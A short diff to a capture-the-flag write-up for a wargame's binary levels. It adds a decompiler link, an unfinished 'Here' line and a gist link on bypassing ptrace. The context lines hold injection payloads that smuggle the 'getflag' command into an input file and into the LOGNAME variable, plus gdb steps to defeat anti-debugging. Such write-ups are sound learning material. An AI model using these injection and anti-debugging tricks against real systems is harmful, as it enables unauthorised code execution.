@@ -132,10 +132,12 @@ $ echo '[x {${exec(getflag)}}]' > /tmp/test && ./level06 /tmp/test
 
 # Level 07
 
-
+We can decompile the file using [dogbotl](https://dogbolt.org) and observe this line.
 ```c
 asprintf(&v1, "/bin/echo %s ");
 ```
+
+Here 
 
 ```sh
 $ LOGNAME="; getflag" ./level07 
@@ -238,7 +240,7 @@ breakpoint in main to
 
 gdb /bin/getflag
 
-bypass ptrace
+[Bypass ptrace](https://gist.github.com/poxyran/71a993d292eee10e95b4ff87066ea8f2)
 
 ```gdb
 catch syscall ptrace
